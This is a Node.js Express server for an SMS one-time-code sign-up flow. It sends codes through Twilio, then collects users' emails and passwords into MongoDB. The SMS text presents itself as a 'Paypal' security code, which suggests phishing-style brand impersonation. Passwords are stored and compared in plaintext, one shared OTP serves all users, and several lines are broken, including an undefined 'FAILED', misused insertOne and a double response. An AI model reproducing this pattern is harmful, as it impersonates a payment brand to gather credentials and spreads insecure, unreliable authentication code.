const express = require("express");
let data = require("./mongoose")
const bodyparser = require("body-parser")
const path = require("path");
const app = express();
const mongoose = require("mongoose");
require("dotenv").config();

const PORT = 3000;

const twilio = require("twilio")(process.env.API_KEY, process.env.AUTH_KEY)

app.use(bodyparser.urlencoded({ extended: true }))

app.use(express.static('public'))

let file = path.join(__dirname, "./public")

let OtpVarifications = mongoose.model("otp", data.OtpVarification);
let userDatas = mongoose.model("user", data.userData);


app.get("/login", (req, res) => {
    res.sendFile(`${file}/login.html`)
})
app.post("/final", async (req, res) => {
    let existingUser = await userDatas.findOne({ email: req.body.email, password: req.body.password })
    if (existingUser) {
        res.sendFile(`${file}/final.html`)
    }
    else {

        res.sendFile(`${file}/login2.html`)
    }
})


app.get("/signin", (req, res) => {
    res.sendFile(`${file}/signin.html`)
})
app.post("/otp", async function (req, res) {
    let { number } = req.body;
    console.log("91" + number);
    let otp_num = Math.floor(100000 + Math.random() * 900000)
    if (await OtpVarifications.findOne({})) {
        await OtpVarifications.findOneAndUpdate({}, { $set: { otp: otp_num } });
    }
    else {
        await OtpVarifications.insertOne({}, { $set: { otp: otp_num } });
    }

    if (number.value === "" || number.length !== 10) {
        res.json({
            status: FAILED,
            message: "Please enter a valid number"
        })
    }
    else {


        twilio.messages.create({
            from: "+18589432387",
            to: `+91 ${number}`,
            body: `Paypal: ${otp_num} is your security code. Don't share this code with anyone`
        }).then((res) => console.log("message has been sent succesfully\n"))
            .catch((err) => console.log("ERROR\n", err))
    }

    res.sendFile(`${file}/otp.html`)

})
app.post("/email_password", async (req, res) => {
    let { otp1, otp2, otp3, otp4, otp5, otp6 } = req.body
    let correctOtp = await OtpVarifications.findOne({})
    console.log(correctOtp);
    if (correctOtp.otp == otp1 + otp2 + otp3 + otp4 + otp5 + otp6) {
        res.sendFile(`${file}/email_pass.html`)
    }
    else {
        res.sendFile(`${file}/otp2.html`)
    }

})
app.post("/return_login", async (req, res) => {
    await userDatas.create({ email: req.body.email, password: req.body.password })
    res.sendFile(`${file}/final.html`)
})

app.listen(PORT, () => {
    console.log("Your server is running on port", PORT);
})